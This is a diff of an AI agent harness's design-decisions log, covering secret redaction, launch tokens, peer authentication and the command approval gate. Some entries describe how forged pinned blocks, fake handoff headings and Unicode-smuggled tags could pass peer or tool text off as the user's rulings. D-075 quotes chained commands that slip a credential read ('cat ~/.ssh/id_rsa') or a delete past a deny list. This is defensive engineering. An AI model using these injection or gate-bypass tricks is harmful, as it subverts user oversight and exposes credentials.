+  second. Limits: loader and interpreter hooks (`LD_PRELOAD`, `PYTHONPATH`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`,
+  `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF`) pass, since they have everyday development uses; `bash -p` was rejected
+  because it would silently defeat an exact `env_allow` for a trusted startup file. Documented in `docs/TOOLS.md`.
+  *Amendment 2026-10-18 (issue #159):* git's environment config is dropped by default, since its values can carry
+  credentials (an `http.extraHeader` bearer token): `GIT_CONFIG_PARAMETERS`, kept only by an exact `env_allow`, and
+  the numbered family `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`. The family is one unit,
+  because a count without its keys fails every git command: it is kept whole only when `env_allow` names
+  `GIT_CONFIG_COUNT`, and dropped whole when `env_deny` or the token-format value check drops any member. So an exact
+  `env_allow` of a single `GIT_CONFIG_KEY_<n>` or `GIT_CONFIG_VALUE_<n>` no longer keeps it, an exception to
+  "`env_allow` keeps a name". Documented in `docs/TOOLS.md`.
+  *Amendment 2026-10-19 (PR #222):* redacting key values out of text has one match model too, `keys.secret_spans`.
+  `keys.redact_secrets` uses it for every caller: tool results in the registry, the engine's `tool.output` pieces, the
+  claude-cli provider, provider test and setup errors, and the `bash` stream. The values go longest first. Each value's
+  matches are found from the left, as `str.replace` finds them, in the text with the spans of the values before it
+  blanked out. So no match overlaps a span taken before. All matches are found in the text itself. Then one `[redacted]`
+  marker goes in per span, in one pass. So no value can match across a marker. Before, each value replaced its matches
+  in turn, and a later value could match text that held an earlier marker. Output changes only for a key value that
+  holds `[` or `]` or is part of the word "redacted". `keep_markers` takes each `[redacted]` already in the text first.
+  The engine's second pass over a streamed piece uses it. So that pass leaves the stream's redaction as it is and cuts
+  out only a key learned since. The `bash` stream holds back the longest end of the unsent text that could start a key.
+  Then, value by value in redaction order, a value's first match that would cross the cut moves the cut back to that
+  match's start. So no span of the whole output crosses a cut, and the stream equals redacting the whole output with the
+  key values known when the command starts. The held text stays under twice the length of all key values together. What
+  still goes out: a key value learned while the command runs is cut out only inside one piece, so such a key split
+  between two pieces goes out in two parts. The result is redacted whole, with every key value known when the call
+  returns. But every cut made to a result comes before that: any cut a tool makes in its own output, and the registry's
+  100,000-character result cap. For example, `bash` keeps 15,000 characters at each end of a longer output, `job_output`
+  keeps the last 20,000, `read_file` cuts a line at 2,000 characters, `grep` cuts a line at 300 and `jobs` cuts a
+  command at 100. So a key value that such a cut splits leaves a part in the result, as it did before this PR. The
+  `bash` stream is redacted before its cut, so its pieces hold no such part. A background job's completion notice had no
+  redaction at all. It now reads the job's whole log file and cuts out the key values known when the job ends. Only then
+  does it cut its command and output to size, so those cuts split no key. A key split where that file rotates at
+  `output_cap` is cut out too (a follow-up to PR #321): while the log is redacted, the end of the older file stands in
+  for the rotation note at its start. `job_output` drops that note when it reads the older file, so such a key is whole
+  in its result and is redacted there too. If the log rotates in the moment between its reads of the two files, the
+  output that rotated is missing, and a key split at either end of it can leave a part there. The `job.updated` events
+  did not redact the command they carry. They now cut known key values out of it before they cut it to 300 characters.
+  As before, only key values Exo knows are redacted: `known_secret_values`, or the list a caller passes (claude-cli
+  passes the secret-named variables of its own environment). Rejected: holding all output until the command ends (no
+  live output). `docs/TOOLS.md` "Streamed output", `docs/JOBS.md` "The completion notice".
+  *Amendment 2026-10-20 (PR #346):* each match blanks out text that a later key would match. So keys that overlap
+  each other, or a key whose end repeats its start, can change the matches further back than one key's length. A
+  chain of three keys left the last 8 characters of the third in a completion notice. The end of the older file put
+  in front of the live log now doubles, up to the whole file, until the text before it can change no match in the
+  live log. Such text can change a value's matches up to its length less one in. A match that starts where matches
+  may change moves that point to its end, for the values after it as well. So the notice never keeps a character
+  that redacting both files as one text would cut out. Only a key split inside a character outside ASCII still
+  leaves a part. The notice reads more of the older file only when a match nears the rotation, at most all of it, so
+  the cost stays linear in `output_cap`. The cut `job_output` makes before redaction can leave a part of a key next
+  to the key it splits, when keys overlap each other. The `bash` stream has no such gap, since it equals redacting
+  the whole output. Rejected: reading the whole older file for every notice after a rotation (5 MB by default).
+  `docs/JOBS.md` "The completion notice".
 - **Rejected:** dropping `EXO_HOME` from tools (the default path is guessable, and tools run `exo`); a token in a
   cookie for the event streams (rides cross-site requests); trusting the TCP bearer token as the principal (TCP
   has no peer process to check); a one-time bootstrap code for the page (more moving parts than the fragment buys
   today).
 - **Limits:** a tool process is the same OS user. Code that reads the credential file without the gate seeing it
-  (the gate classes a plain read as `credentials`, always ask; indirection is the gate branch's work) and also
-  detaches from the core's process tree could still pass. The real fix is an OS sandbox for tool subprocesses.
-  The page link sits in browser history and, briefly, in the browser launcher's argv. The env scrub is a
+  (the gate classes a read of the file, of its run folder or of a wildcard there as `credentials`, always ask,
+  #169; indirection is the gate branch's work) and also detaches from the core's process tree could still pass.
+  The real fix is an OS sandbox for tool subprocesses. The page link sits in browser history and, briefly, in the
+  browser launcher's argv. The env scrub is a
   heuristic.
 - **Not changed:** the TUI approval card's focus behaviour (another branch is editing the TUI); noted for later.
   The echo engine (a test double) still accepts any answer.
+- **Later (2026-10-17, #166):** the launcher's argv was a real leak, not a brief one: `webbrowser.open` hands the
+  `#token=` link to `xdg-open` and the browser, whose command lines any user of the host can read in `/proc` unless
+  it is mounted with `hidepid`, and the token answers approvals as `principal:web`. So the one-time bootstrap code
+  rejected above is now how the browser opens: `exo web` opens `#code=<one-time code>` (fresh per launch, in memory,
+  one use, 120 seconds), and the page trades it for the token at `POST /api/launch`, the only `/api/` route without
+  the token, with every other check of `providers.guard`. A used code that comes back means two parties held it: the
+  token is replaced, every other connection ends (the old token's streams, and requests that passed the token check
+  but still wait for their body), a body is checked against the current token again once read, and the terminal
+  gets a warning and the new link, to paste into the open browser rather than click (a click puts it back in a
+  launcher's argv). The printed `#token=` link is unchanged (stdout is the user's own); with a non-loopback `--host`
+  no browser is opened. Limit, stated plainly: the hop from the browser to the web server is not checked by uid. Any
+  process on the host that has the token, or wins the race for an unused code inside its 120 seconds, is the page.
+  The race shows up as a replaced token and a terminal warning only when the launched page also redeems the code
+  after the winner: the first redemption is silent. A browser that never runs the page's script (a text browser
+  such as `lynx` or `w3m`, which `webbrowser` falls back to with no display) never redeems, so the winner keeps a
+  working token and nothing warns. Kernel peer checks do not cover this hop either: D-060 (#175, Unix peer
+  authentication) checks clients of the core's socket, not a browser on TCP, and must name this hop in its Limits
+  when it lands. Rejected for now: opening a 0600 local file that redirects to the `#token=` link
+  (the other fix #166 named). It needs no second redemption, but leaves the token on disk until removed, and a
+  sandboxed browser (snap, flatpak) may not read the file. Revisit if launches without a script-running browser
+  matter. `docs/ui/WEB.md` "Opening the page and the page token".
 
 ## D-040 (2026-10-12) Who wrote it: authors on every message, pinned keys, an anchored ledger head
 - **Why:** the 12 October audit (priorities 4 and 6). (a) `exo_note` let the agent write `kind="ruling"`, and
@@ -837,6 +1524,12 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   it changes), frames it as a bus message with author `bus:<seat>`, and runs the peer policy: `remote` is held by
   default. The channel posts a reply only for a turn that an auto-delivered message started. The relay signs with its
   own key only on a post it marks `{"relay": {"composed_for": seat}}`, and readers never count that as the seat.
+  *Amendment 2026-10-22 (#455):* the relay validates numeric HTTP query parameters before SQLite sees them.
+  Message and inbox `since` and verification `to` range from 0 to 2^63 - 1; verification `from` starts at 1.
+  Message and inbox page limits range from 1 to 1,000. Invalid values answer 422 through FastAPI's query
+  validation, as malformed integers already did. This prevents SQLite overflow errors from answering 500 and
+  negative limits from lifting the page cap. Rejected: clamping invalid values, which silently changes the
+  requested range, or catching database overflow after dispatch, which leaves negative limits unbounded.
 - **Keys:** `$EXO_HOME/keys/registry.json` (0600) pins local signing keys (on creation in `keys/`), bus seat keys,
   and principal ids. `exo log verify` and `exo memory verify` pass it as `trusted`: an unpinned key fails, and so
   does a seat signing as another pinned name. `exo keys` lists and pins.
@@ -857,6 +1550,95 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   registry, or sends `turn.send` on the seat's socket (that counts as the principal until approval identity is
   bound to the connection, a separate change). The gate is what asks before writes to `keys/` and the store; the
   registry, the anchors and `ledger.sqlite.head` belong on its sensitive-path list.
+  *Amendment 2026-10-18 (PR #216):* exo-context pinned peer, bus and job text as the principal's words. Its
+  `select_context` now gets each message's author, and it pins only the principal's. A handoff carries a pinned
+  block only from a message that opens with it (exo-context's own block) or with a compaction marker (a host's
+  summary). A block quoted further down a message is data: the core's system message quotes small spans word for
+  word, peer turns included.
+  *Amendment 2026-10-20 (#368, #370, #371):* the four readers of a host message dict now take its author from
+  `provenance.author_of`, meta tags included, the way core capture reads it. A peer, bus or job tag in `meta`
+  refuses at any role and outranks a stamped author, by presence rather than truthiness. An untagged assistant
+  message is the agent's and no longer counts as an older host's message. An untagged user message still reads as
+  the principal, so older hosts keep working. A host summary in an assistant row carries nothing, flagged or not.
+  The host persists its `_compressed_summary` flag and restores it on resume, so the flag shows a host made the
+  row. It does not show that exo-context escaped the row's text when it was made, and summaries a host built on
+  its own never pass that escaping. Continuity across those rows comes from exo-context's session pins instead.
+  The engine observes pins only from principal-classified text, persists them per session, and merges them at
+  compaction and at handoff write. A `meta` that is not a mapping names no tag and no author, and never raises.
+  Roles other than user, assistant and tool still read as the system's, as before.
+  *Amendment 2026-10-20 (#385):* a row opening with a compaction marker carries nothing now, whatever its role.
+  A stock summary a host built on its own and stored as a user row reads as the principal's turn through
+  `author_of`, and nothing about the row separates it from a summary exo-context wrote and escaped itself. The
+  block is carried only from a system or user message that opens with it. The session pins take open decisions
+  beside rulings and corrections, principal deferrals only, read through `principal_view`. The pins also follow
+  the session id: a compression child session inherits its parent's pins, and a reset-only switch rebinds
+  through `bind_session_state`, a branch child inheriting its parent's pins. With those, everything a pinned
+  block held survives compaction by the pins instead, across session moves too.
+  *Amendment 2026-10-21 (#398):* the survival sentence above holds only where the session's pins were
+  observed. A session last compacted before pins were observed at compaction (any 0.2.0 Hermes session:
+  0.2.0's `compress` never observed pins) holds its rulings, corrections and open decisions only in the
+  summary's block, and all three drop at its first compaction after the upgrade. The handoff written at
+  that earlier compaction still has them, and `/exo resume` reads it back; a 0.2.0 handoff may quote a
+  forged block, so it is a record to read, not the principal's words. Open-decision pins are also capped
+  at the newest 12, in `_observe` and in `_carry_pins`: a deferral never expires on its own, and the
+  uncapped list grew the pins file and the per-turn scan over it for the life of the session. The cap is
+  the one the compaction block and the handoff already applied to the merged list.
+  *Amendment 2026-10-20 (#322 item 4, #381):* `defuse_pins` also escapes the tag spelled in characters a
+  downstream step may fold back to ASCII. That is unicode tag characters (U+E0020-E007E), which a reader may
+  decode to the ASCII they mirror or drop, and every character whose NFKC form is one ASCII character. Full-width
+  forms, the small brackets, mathematical and circled letters are in that second group. Detection runs over
+  same-length views of the text and escapes the union of their matches in the original at the same offsets. The
+  views are the text itself, the NFKC fold with tag characters left in place, and that fold with tag characters
+  decoded. One folded view alone is not enough. It turns a tag character inside the name into a letter and breaks
+  the match the unfolded view makes, where that character is filler. The quoted spans themselves are not
+  normalized. Still open, as look-alike territory: characters whose NFKC form runs to more than one character,
+  accent stripping (NFKD, then dropping combining marks), and look-alike letters from other scripts.
+- *Amendment 2026-10-18 (fix sweep, #221):* the anchors are written after the append's COMMIT, from the committed
+  head, so a writer killed in between leaves them one event behind, never ahead. That lag of one event is accepted.
+  The copy under `keys/heads/` is written even when the anchor beside the ledger fails. Before it writes, an append
+  catches the anchors up when the one beside the ledger trails the head or no anchor is at the head. It refuses
+  ("cannot be written") when the one beside the ledger trails and cannot be written, or when no anchor is at the head
+  and none can be written. So appends never go on more than one event past every anchor. The refusal says to restore
+  write access. `verify` reports `anchored_seq`. The `keys/heads/` anchor is named after the ledger's path with its
+  folder resolved but not the file, so a ledger file swapped for a symlink keeps its anchor. A ledger file that is a
+  symlink fails verify, and append and `exo log anchor` refuse it. An anchor is read only as a regular file, and it
+  is written through a fresh temporary file (`mkstemp`) that a symlink planted in the folder cannot redirect.
+  `exo log anchor` refuses to replace an anchor that does not match. `--force` does, for a store an older Exo left
+  one event ahead. `exo import-store` skips `.head` with the ledger and drops a stale anchor a deleted store left for
+  the destination. Not covered: a store folder deleted whole. `exo memory verify` lists only the stores that exist,
+  so the deleted store's `keys/heads/` anchor is read only with `--principal <id>`. Nor a store folder replaced by a
+  symlink to another folder: a crafted copy behind the link verifies clean (#277). A code fix is tracked with the
+  deferred `keys/heads/` scan and must allow for the M1 migration in `docs/ARCHITECTURE.md` (symlink first, then
+  move). Since #277 a ledger file that is a symlink is opened read-only when there is no authority, and `verify`
+  warns, without failing, when the two anchors are more than one event apart.
+- *Amendment 2026-10-19 (#279):* PR #216 stopped a block quoted further down a message from being carried into a
+  handoff, but the model still read it as one: the core's system message printed a peer's, bus seat's, job's or
+  tool's `<exo-pinned>` block word for word. Where the harness prints a message for the model, text whose author is
+  not `principal` now has each pinned-block tag escaped (`exo.provenance.defuse_pins`: `&lt;exo-pinned&gt;`). That
+  is `render_message` (the verbatim spans and the summarizer's source), the note on other threads' turns, and
+  recalled memory. Every summary is escaped as it is made, whatever it summarizes, since a summarizer can decode the
+  escaped tag or write one: the core's summary nodes (`TreeContext._run`) and the summary in exo-context's
+  `[CONTEXT COMPACTION]` message, its own compressor's or a host's, before exo-context adds its own block. So is the
+  handoff that `/exo resume` puts into the system message (`exo.handoff.resume_text`); the handoff records the
+  principal's rulings as quoted items, never as a pinned block. The match takes any case, any run of spaces,
+  punctuation or invisible characters before, between or inside the letters of the name, and a missing `>`. The
+  tags are escaped, not removed, so nothing anyone wrote vanishes. The principal's own words keep them outside a
+  summary. exo-context's inner compressor keeps each message's author on its way to the summarizer, and the note
+  names a bus seat's turn `bus`, not `user`. Not covered: the verbatim tail, where each turn reaches the model as its
+  own message inside its ingress tag; a summary that restates a block in other words; look-alike letters from
+  other scripts. Full-width brackets moved to covered by the #322 item 4 amendment above.
+- *Amendment 2026-10-20 (#315):* the handoff writer put the compaction summary under `## State` unquoted, and the
+  reader kept the last section of each name. A summary holding a `## Decisions made (principal's words, verbatim)`
+  line therefore replaced the principal's section in `load_handoff`: the summary's ruling came back as the
+  principal's, the quoted last report after it came back as one too, and the real ruling was dropped. The writer
+  now quotes the summary like the brief and the last report, so no line of model text opens a section, and
+  `_sections` keeps the first section of each name, so a duplicate heading in an older file reads the writer's
+  section in the parsed fields (`resume_text` still carries the raw file). The summary's words stay in the file, quoted.
+- *Amendment 2026-10-20 (#353):* first-wins had the opposite effect on `Next steps`, the one section written
+  after every untrusted one. A multiline tool path or command in a list field, or a pre-#349 file's unquoted
+  summary, could put a forged `## Next steps` first and beat the genuine copy, retrieval query included. List
+  fields and the topic line are now flattened to one line when written, and `load_handoff` reads Next steps from
+  its last copy in the file. Every other section still reads the first.
 
 ## D-041 (2026-10-12) Audit correctness fixes: eight bugs no test caught
 - **Why:** an external audit read `src/exo/core` and found bugs the suite passed over. Each got a failing test first.
@@ -876,6 +1658,11 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   refused, not replaced; remote descriptions are marked untrusted third-party text.
 - **Not done:** terminal event-loop blocking and approval focus (another branch); gate, approvals, capture and
   ledger items (other branches).
+  *Amendment 2026-10-18 (PR #216):* undo deleted every later agent-tree summary and the thread's context notes, so
+  other threads' news was lost. It now deletes only the nodes that hold an undone entry and the merges above them,
+  and keeps context notes. It also reaches the context plugin: `on_session_switch(rewound=True, messages=,
+  summaries=)`. exo-context then drops the undone turns' pins and the deleted nodes, and writes again each
+  automatic handoff that may quote them.
 
 ## D-042 (2026-10-12) Repo hygiene: privacy, licensing, CI
 - **Why:** an outside audit found that D-004 (nothing in the package names the principal) was not met, that no CI
@@ -981,6 +1768,18 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
 - **Contested questions:** answered by ruling 4 (above): reasoning style only.
 
 ## D-045 (2026-10-12) Approval cards never outlive their request; the web stream resumes; a queued steer can be pulled back
+- **Amendment 2026-10-20 (#361):** terminal steer lines explicitly show sending, queued and delivered. A send reply
+  alone never proves delivery: the matching user `message.completed` does, including when it arrives before the
+  reply; the existing successful `unsteer` acknowledgement can also confirm it already left the queue. Such early
+  event receipts are held only while sends are in flight. A lost reply shows delivery unknown; a refused
+  send shows not sent. The activity line leads with the queued count while a draft is typed. Approval cards lead
+  with `Ctrl+F, then [o] once [a, Enter] always [d, Enter] deny`, before request details. Ctrl+F still deliberately
+  focuses the card, preserves the draft and keeps the existing answer confirmation. No binding or authority changes.
+  Send and unsteer replies received after a thread switch never update the new thread's draft or queued count.
+- **Amendment 2026-10-19 (#276):** the terminal serializes approval-card removal with thread switching and restoration,
+  and waits for removal before mounting the next card under the same widget id. A close or answer names its request,
+  so a stale event cannot remove its replacement. Threadless requests still survive thread switches. The response
+  worker starts after the answered card's removal. No command, key, setting or approval authority changes.
 - **Why:** the principal reported an approval card stuck on screen in the terminal and on the web with nothing pending in
   the core, a card the terminal could not answer, a web chat that stopped responding, and wanted to cancel a queued steer.
 - **Stuck card, core:** `CoreEngine.ask` published `approval.resolved` only from the respond path. A turn stopped or
@@ -1055,6 +1854,11 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
 - **Rejected:** a preview deployment of the production project (shares settings and domain, easy to promote by mistake);
   a branch-based flow (the site is deployed from a git-free copy on purpose).
 - **Revisit if:** the site gains a build step or more than one maintainer deploys, when CI should own promotion.
+  *Amendment 2026-10-20 (PRs #352, #358, #359):* the script fails closed where git's view of `site/` and the copy could
+  differ. Any deploy refuses when `site/` holds untracked files (ignored ones too), contains a submodule, is itself a
+  symlink (untracked, or tracked with mode 120000) or is not a directory, and when git cannot list the files or read the status of `site/`; a
+  versioned deploy also needs a clean `site/`. An empty `EXO_VERCEL_CLI` exits 2 rather than falling back to the pin.
+  There is no override. Symlinks inside `site/` stay allowed: `rsync -a` copies them as links, not their targets.
 - **Docs:** `docs/DEVELOPER-GUIDE.md` "Deploying the site".
 
 ## D-048 (2026-10-12) Exopet: Exo as a living lattice
@@ -1334,6 +2138,102 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   present, and ion could not dispatch it without a repository-wide permission); `stale-while-revalidate` (it breaks the
   latency bound).
 - **Open:** whether #108 moves to `v: 2` before merging or `v: 1` stays the deployed contract (recommended: it moves).
+## D-060 (2026-10-13) Unix peer authentication before the principal credential moves
+- **Why:** D-039 bound approval identity to the connection, but the credential checks were one-sided and partly
+  fail-open. A principal client read the credential file and sent it to whatever served the socket path, so a
+  replaced socket received it. The core checked only that the peer pid was not a descendant, never the peer's
+  user, and an unreadable parent chain counted as "not a descendant": a tool child that connected and then exited,
+  leaving the connection to an orphan, was stamped the principal. Handoff: the shared-protocol review of
+  2026-10-13 (peer authentication first, then the snapshot and heartbeat contract).
+- **Decision, client:** `Client(socket, principal=label)` uses `exo.peerauth.PrincipalTransport`. It connects,
+  asks the kernel for the peer (`SO_PEERCRED` on Linux; `LOCAL_PEERCRED` and `LOCAL_PEERPID` on macOS), reads the
+  launch record through one descriptor (no symlink, one link, owner-only, bounded, v1), and requires this user,
+  the record's pid and the record's process start identity. Only then does that record's token go on that same
+  connection, and only on `POST /command`. Any failure is a `ConnectError` (`PrincipalRefused`) with the reason and
+  zero bytes written; the web page passes the reason through with a restart hint.
+- **Decision, core:** the launch record (`<socket stem>.principal.key`, same path and mode) is JSON binding token,
+  pid, uid, process start identity and launch instance in one atomic write, before the socket accepts. The core
+  takes the kernel peer and that pid's start identity at accept. `principal` needs the token, this uid, a peer
+  pid that still names that process and started before the accept (a pid reused after the accept fails), and a parent chain that reads
+  cleanly to pid 1 without the core; an unreadable chain is the tool tree. `descends_from` fails closed
+  accordingly; there is one walker. A credential taken as local is logged once per process with the reason, and
+  that connection's refusals name it (`/rename` and the subagent verbs too); a log line that cannot be written
+  does not change the answer. Other platforms: no principal over the socket.
+- **Unchanged (D-039, D-052):** the principal comes from the connection; in-process clients are the principal by
+  construction; stdio and TCP are local; only a principal caller acts as the principal. No command or event added.
+- **Snapshot and liveness (handoff items 2 and 3, the parts that ride on this):** `hello` reports `instance` and
+  `heartbeat`; the event stream's opening comment carries both; `approvals.list` adds `cursor: {instance, seq}`
+  from the same await-free copy. A failed `approval.requested` publication no longer leaves a pending row. A
+  filtered subscription's heartbeat timeout is absolute, so other sessions' traffic cannot starve it. The Python
+  client ends a stream with no complete frame (event or heartbeat) for 45 s and skips a frame over 16 Mi characters, resuming
+  after its seq (resuming at it replayed it forever). The core writes frames as raw UTF-8, so a frame stays near
+  the request that made it (`ensure_ascii` had made raw emoji three times larger). A joined terminal window no
+  longer resends a turn, approval answer or other change after a lost reply; it resends only reads and commands
+  whose connection never opened. It says the change may not have been delivered, keeps the typed text and
+  re-reads `approvals.list` to put back a card the core still holds. The client reads on after a skipped frame
+  without `reconnect` too, so a caller that keeps its own `since` (the exo-bus channel, the web source) gets the
+  next event. Until a later event arrives, each new stream it opens (after a restart or a dropped connection)
+  still asks for the skipped frame and skips it again: one re-read per reconnect, not a stall. A skipped frame
+  that comes again ends such a stream.
+- **Scope against the handoff:** no ruling conflicted. D-039's file name and gate credential class are kept, so the
+  launch record replaces the token file's contents rather than adding a file. The OS surface lives in another
+  repository and migrates there. Clients expose the stream `instance` but the terminal and web views do not yet
+  take a fresh snapshot when it changes. Required response bindings, phone factors and transcript cursors stay out
+  (handoff items 3 and 4; item 4 needs a ruling on D-033's "principal always").
+- **Limits:** same-user code outside the core's tree remains trusted and can read the record. A tool child whose
+  parent exits before it sends its request is still not caught (issue #31); the fix is the tool sandbox. The
+  dead-peer check, not the parent walk, makes the orphan of a tool child that connected and exited local, and
+  only reliably on Linux: macOS `LOCAL_PEERPID` names the last process to use the socket. A core from before this
+  change has a plain-token file, which new clients refuse (restart the core). An old client against a new core
+  sends the whole record as its token and is local with no message (restart `exo`, `exo web`, `exo chat`). Under
+  `hidepid`, `ProtectProc` or `ProcSubset=pid` an unreadable ancestor (`sshd`, `login`, `su`, `sudo`) makes every
+  client below it local, on purpose: stopping at the first unreadable ancestor would let `tool -> sudo -u $USER
+  exo` pass. The core logs it and the refusal says so. A client in another PID namespace than the core is refused
+  (the kernel names pid 0), and a core that cannot read its own process entry warns and serves no principal. A pid
+  reused between connect and accept is not detected (that window is the accept latency; Linux `SO_PEERPIDFD` would
+  pin the process). The browser-to-web hop (the `exo web` page to its own server, over TCP) is not peer-checked;
+  the page token protects it and, since #177, the one-time launch code (D-039, #166).
+- **Amendment 2026-10-19 (issue #226):** the follow-ups from the #175 reviews. No change to who is the principal.
+  - `hello` names a heartbeat only where the transport sends one. Over HTTP it is that server's own interval (it
+    was the module default even for a server that pinged at another rate). Stdio and in-process callers get no
+    pings, so their `hello` has no `heartbeat` key or capability. The key shipped in no release.
+  - The Python client splits the event stream into lines itself, at CRLF, LF or CR as SSE defines them, and holds
+    at most 16 Mi characters of one line. A longer frame is refused before the rest of it is read, then skipped by
+    its seq as before. httpx's line reader held the whole line first, so a 40 MiB line was read in full. The other
+    `str.splitlines` breaks (U+0085, U+2028, U+2029, VT, FF) no longer end a line; the core escapes the three that
+    JSON can hold raw, so the core's frames read the same.
+  - The parent walk reads one stat line per ancestor; it read the boot id and all of `/proc/stat` per ancestor, on
+    the event loop. The boot id is read once per process. btime is still read for each start and not cached:
+    Linux moves it when the wall clock steps, and the start is compared with the wall clock at accept.
+  - The terminal says `not sent: <reason>` for a command whose connection never opened (a `ConnectError`, which
+    a refused peer check is), instead of "may not have been delivered". The text goes back to the composer.
+  - A core that cannot read its own start identity names its platform's cause (hidepid on Linux, libproc on
+    macOS, no lookup elsewhere), in its log and in the client's refusal, instead of a hidden `/proc`. The unused
+    `principal.peer_pid` is removed.
+  - The macOS branches ran on a Mac: `LOCAL_PEERCRED` and `LOCAL_PEERPID` parsing and libproc's `proc_bsdinfo`
+    parsing are tested on every platform, and a test with no mocks runs the kernel calls and the parent walk on
+    Linux and macOS. A hosted Mac runner is still #145.
+- **Validation:** `tests/security/test_unix_peer_auth.py`: a replaced socket gets zero bytes; stale, symlinked,
+  shared, old-format and missing records refuse before any byte; an unsupported platform fails closed both ways; a
+  mismatched kernel uid is local; a tool child through the real client, and the orphan of one that exited, are
+  local; the TUI and web clients act as the principal and stream; reconnect after restart takes the new record;
+  the snapshot cursor, the publication failure, heartbeat starvation, the frame deadline and no-resend. The D-039
+  and D-052 attack scripts now steal the record's real token. `tests/security/test_unix_peer_auth_edges.py`: a
+  raw UTF-8 `turn.send` near `MAX_BODY` against a real core does not stall `Client.events` or a joined window's
+  `SharedClient.events` (an emoji message is delivered, a NEL one is skipped); a frame too large is skipped by
+  seq; line separators and lone surrogates round-trip; a uid above 2^31; pid 0; a pid that names another process
+  by stamp time; the parent walk with a clean, unreadable and descendant chain; the demotion reason in the log and
+  the refusal, also from `/rename` and the subagent verbs and with stderr closed or broken; a core without its own
+  start identity; the record in place before the socket accepts and revoked when the listen fails; a frame too
+  large with no `id:` ends the stream; the refusal type. `tests/clients/tui/test_lost_reply.py` (a lost turn,
+  approval answer, `question.answer` or unsteer) and the web's
+  `test_refused_principal_names_the_reason_and_the_restart`. A skipped frame that comes again ends the stream
+  (`test_unix_peer_auth_edges.py`), and the exo-bus channel's event loop reads past one
+  (`plugins/exo-bus/tests/test_bus_plugin.py`). #226: a line over the bound is not read in full, line ends follow
+  SSE, one stat read per ancestor, the platform cause, the darwin parsing and the no-mock kernel test
+  (`test_unix_peer_auth_edges.py`); the per-transport `hello` (`tests/protocol/test_server.py`); the terminal's
+  `not sent` reason (`tests/clients/tui/test_lost_reply.py`).
+- **Docs:** `docs/GATE.md` "Unix peer authentication", `docs/ui/WEB.md`, `docs/DEVELOPER-GUIDE.md`.
 
 ## D-061 (2026-10-13) Web sub-pages to the site v2 standard
 - **Why:** the chat page and the site v2 (front page, roadmap) set a high bar; Tasks, Schedule, Command and Providers
@@ -1425,6 +2325,11 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   loop is never repaired mid-turn.
 - **Limits:** child approvals shown in the parent, and `followup` or `resume`, are follow-ups. Typing straight into a
   child's session still steers it through `turn.send`; that path works but leaves no note on the receipt.
+  *Amendment 2026-10-18 (fix sweep, core sessions):* the child's loop shares the engine's per-session state. So
+  `turn.send` into a running child steers it in any mode, and only the principal may send it (D-052). While the
+  child starts or finishes, no round can take a steer, and `turn.send` fails with `conflict`. It never starts a
+  main-loop turn in the child. A send that waited behind a child that was locked meanwhile runs no turn. A peer
+  message with no session never picks a child (docs/AGENT-WIRE.md).
 - **Docs:** `docs/COMMANDS.md`, `docs/UI.md`, `docs/ui/WEB.md`, `docs/USER-GUIDE.md`, `docs/DEVELOPER-GUIDE.md`.
 
 ## D-073 (2026-10-13) Signed updates verify against a pinned trust list (issue #42)
@@ -1437,7 +2342,181 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   every later key change visible. Opt-in because the project does not sign releases yet.
 - **Limits:** trust on first use of the pin; SSH signatures only; commit signatures, not tags; `uv tool` installs
   cannot be verified. A key compromise needs the pin edited by hand.
+- **Amended 2026-10-17:** three gaps closed. git chooses the verify backend from the signature's armor, not from
+  `gpg.format`, so an OpenPGP or X.509 signature went to the local gpg keyring and never read the pin. The check now
+  switches both backends off and requires an SSH signature header. A `config.json` that exists but cannot be read,
+  or a `require_signed` that is not a boolean, refuses the update instead of reading as off. Once a pin exists,
+  `--pin-trust REV` takes a different list only if the commit that last changed it in REV's first-parent history
+  verifies against the current pin. The commit that set the list is checked, not REV, because the documented
+  rotation pins `@{u}` when later commits are signed only by the new key. No override flag: the hand edit above is
+  the override. A list a pinned key signed earlier can still be pinned again (no rollback protection). The pin,
+  `$EXO_HOME/update/allowed_signers`, and `config.json` are not yet store paths, so a plain `cp` or redirect to
+  them is not asked about. D-074 (#125) adds them. A commit message need not be UTF-8: only the header is read.
 - **Docs:** `docs/INSTALL.md` "Signed updates", `docs/DEVELOPER-GUIDE.md` "Cutting a release", `CHANGELOG.md`.
+
+## D-075 (2026-10-13) A deny or reserved entry matches any simple command on a line
+- **Why:** the 2026-10-13 review. `classify_shell` reduces a compound line to its most severe part, and `decide`
+  checked the principal's `deny` and `reserved` lists against that one part only. With `vcs_push` in `deny`,
+  `git push origin main` alone was denied, but `git push origin main && rm -rf build` was an `ask` for the delete,
+  `git push origin main; cat ~/.ssh/id_rsa` an `ask` for the credential read, and `git push origin main && gh pr
+  comment 3 --body hi` an `ask` for the post. The card named the other action, and the denied push ran once it was
+  approved. Only `command:<regex>` entries were immune, because they see the whole line.
+- **Decision:** a classification keeps the simple commands it was built from (`parts`, nested through `bash -c`,
+  `python -c`, `eval`, `xargs` and the rest). `decide` applies the principal's scopes to each and checks `reserved`
+  and `deny` entries against the combined result and every part; a hit on any part denies (or reserves) the line.
+  Parts are checked for `deny` and `reserved` only: rules, category overrides, the opaque bump, third-party
+  escalation, posting checks and the floors still see the dominant part, which sets the card, the category and
+  everything else. A part carries the tool of the call it came in on (`tool:execute_code` names the tool, not
+  `python -c` run from bash) and the decoded views of its line (#136), so a `command` entry matches a part as it
+  matches the line (`g''it push origin main && rm -rf build`), the `ssh` hop is a part of its own whose target is
+  the bare host (no `user@`, `ssh://` or `:port`) and the destination as written, and the inner commands of an `ssh`
+  line are `internal` like the line. A
+  string literal in code is kept when any simple command in it is non-benign, whatever the order. A mapping entry in
+  `deny` or `reserved` counts only its match keys: `reason`, `name`, a note or a typo is dropped, so it widens the entry
+  and never voids it (rejecting it at load would fall back to the defaults and lose the whole list). `Decision.reserved`
+  lists the parts a reserved entry matched, once each, under the pinned policy and a pending one alike, and the exo-gate
